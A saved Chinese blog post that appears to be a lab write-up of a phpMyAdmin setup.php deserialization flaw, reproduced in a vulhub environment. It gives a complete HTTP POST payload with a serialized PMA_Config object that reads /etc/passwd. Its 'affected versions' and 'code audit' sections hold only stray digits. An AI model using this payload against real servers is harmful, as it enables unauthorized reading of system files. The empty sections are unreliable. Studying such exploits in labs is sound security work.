\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[www.cnblogs.com\](https://www.cnblogs.com/xhds/archive/2004/01/13/12579425.html)

**目录**

*   [简介](#_label0)
*   [影响版本](#_label1)
*   [代码审计](#_label2)
*   [利用过程](#_label3)

[回到顶部](#_labelTop)

简介
--

**环境复现：**https://github.com/vulhub/vulhub

**线上平台:** 榆林学院内可使用协会内部的网络安全实验平台

phpMyAdmin 是一套开源的、基于 Web 的 MySQL 数据库管理工具

[回到顶部](#_labelTop)

影响版本
----

1 1

[回到顶部](#_labelTop)

代码审计
----

1

[回到顶部](#_labelTop)

利用过程
----

```
http://192.168.52.129:8080/scripts/setup.php

```

发送如下数据包，即可读取`/etc/passwd`

[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")

```
POST /scripts/setup.php HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate
Accept: \*/\*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 80

action=test&configuration=O:10:"PMA\_Config":1:{s:6:"source",s:11:"/etc/passwd";}

```

[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")

![](https://img2020.cnblogs.com/blog/967964/202003/967964-20200327095005500-1274656986.png)